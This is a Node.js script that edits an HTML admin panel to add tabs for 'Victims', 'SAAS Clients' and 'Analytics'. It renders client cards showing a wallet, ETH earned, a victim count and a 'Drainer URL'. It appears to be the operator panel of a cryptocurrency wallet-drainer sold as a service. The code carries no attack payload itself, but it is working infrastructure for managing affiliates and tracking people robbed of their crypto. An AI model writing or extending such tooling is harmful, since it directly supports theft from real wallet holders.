const fs = require('fs');

// Read the original panel
const panelContent = fs.readFileSync('panel.html', 'utf8');

// Find the position to insert the SAAS clients tab
const headEnd = panelContent.indexOf('</style>');
const bodyStart = panelContent.indexOf('<body>');
const navStart = panelContent.indexOf('<nav>');

if (headEnd !== -1 && bodyStart !== -1 && navStart !== -1) {
  // Insert SAAS clients styles before </style>
  const styles = `
        /* SAAS Clients Styles */
        .clients-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; margin-top: 20px; }
        .client-card { background: #fff; border: 1px solid #e0e0e0; border-radius: 8px; padding: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .client-card h3 { margin: 0 0 10px 0; color: #333; border-bottom: 2px solid; padding-bottom: 5px; }
        .client-info { margin: 10px 0; }
        .client-info div { margin: 5px 0; font-size: 14px; }
        .client-stats { display: flex; justify-content: space-between; margin-top: 10px; padding-top: 10px; border-top: 1px solid #eee; }
        .stat { text-align: center; }
        .stat-value { font-size: 18px; font-weight: bold; color: #4CAF50; }
        .stat-label { font-size: 12px; color: #666; }
        .client-actions { margin-top: 10px; display: flex; gap: 10px; }
        .btn { padding: 5px 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; text-decoration: none; display: inline-block; }
        .btn-primary { background: #007bff; color: white; }
        .btn-success { background: #28a745; color: white; }`;
  
  // Insert tab navigation and SAAS clients content
  const tabNav = `
    <!-- Tab Navigation -->
    <div class="tabs">
        <div class="tab active" onclick="switchTab('victims')">🎯 Victims</div>
        <div class="tab" onclick="switchTab('saasClients')">🛒 SAAS Clients</div>
        <div class="tab" onclick="switchTab('analytics')">📊 Analytics</div>
    </div>`;
  
  const saasClientsContent = `
    <!-- SAAS Clients Tab -->
    <div id="saasClients" class="tab-content">
        <h2>🛒 SAAS Clients</h2>
        <div id="clientsContainer">
            <p id="noClientsMsg">Loading SAAS clients...</p>
            <div class="clients-grid" id="clientsGrid" style="display: none;"></div>
        </div>
    </div>`;
  
  // Replace the existing navigation with tabs
  const navEnd = panelContent.indexOf('</nav>') + 7;
  const beforeNav = panelContent.substring(0, bodyStart + 6);
  const afterNav = panelContent.substring(navEnd);
  
  // Insert styles
  const newContent = panelContent.substring(0, headEnd) + styles + panelContent.substring(headEnd, bodyStart + 6) + 
                    tabNav + saasClientsContent + afterNav;
  
  // Add JavaScript for SAAS clients
  const scriptInsert = `
    <script>
        // Tab switching
        function switchTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            
            document.querySelector(\`.tab[onclick="switchTab('\${tabName}')"]\`).classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }
        
        // Load SAAS clients
        async function loadSaaSClients() {
            try {
                const response = await fetch('/api/saas-clients');
                const data = await response.json();
                
                if (data.success && data.clients.length > 0) {
                    document.getElementById('noClientsMsg').style.display = 'none';
                    const grid = document.getElementById('clientsGrid');
                    grid.style.display = 'grid';
                    grid.innerHTML = '';
                    
                    data.clients.forEach(client => {
                        const card = document.createElement('div');
                        card.className = 'client-card';
                        card.innerHTML = \`
                            <h3 style="border-bottom-color: \${client.themeColor}">\${client.projectName}</h3>
                            <div class="client-info">
                                <div><strong>ID:</strong> \${client.clientId}</div>
                                <div><strong>Wallet:</strong> \${client.wallet.substring(0, 8)}...</div>
                                <div><strong>Registered:</strong> \${client.registrationDate}</div>
                            </div>
                            <div class="client-stats">
                                <div class="stat">
                                    <div class="stat-value">\${client.totalEarnings}</div>
                                    <div class="stat-label">ETH Earned</div>
                                </div>
                                <div class="stat">
                                    <div class="stat-value">\${client.victimCount}</div>
                                    <div class="stat-label">Victims</div>
                                </div>
                            </div>
                            <div class="client-actions">
                                <a href="\${client.drainerUrl}" target="_blank" class="btn btn-primary">Drainer URL</a>
                                <a href="\${client.dashboardUrl}" target="_blank" class="btn btn-success">Dashboard</a>
                            </div>
                        \`;
                        grid.appendChild(card);
                    });
                } else {
                    document.getElementById('noClientsMsg').textContent = 'No SAAS clients registered yet.';
                }
            } catch (error) {
                console.error('Error loading SAAS clients:', error);
                document.getElementById('noClientsMsg').textContent = 'Error loading clients.';
            }
        }
        
        // Load SAAS clients when tab is activated
        document.addEventListener('DOMContentLoaded', function() {
            // Set up tab click handlers
            document.querySelectorAll('.tab').forEach(tab => {
                tab.addEventListener('click', function() {
                    if (this.textContent.includes('SAAS Clients')) {
                        loadSaaSClients();
                    }
                });
            });
            
            // Load victims by default
            switchTab('victims');
        });
    </script>`;
  
  // Insert the script before closing body tag
  const bodyEnd = newContent.lastIndexOf('</body>');
  const finalContent = newContent.substring(0, bodyEnd) + scriptInsert + newContent.substring(bodyEnd);
  
  fs.writeFileSync('panel.html', finalContent);
  console.log('✅ Panel updated with SAAS clients tab!');
} else {
  console.log('❌ Could not find insertion points in panel.html');
}
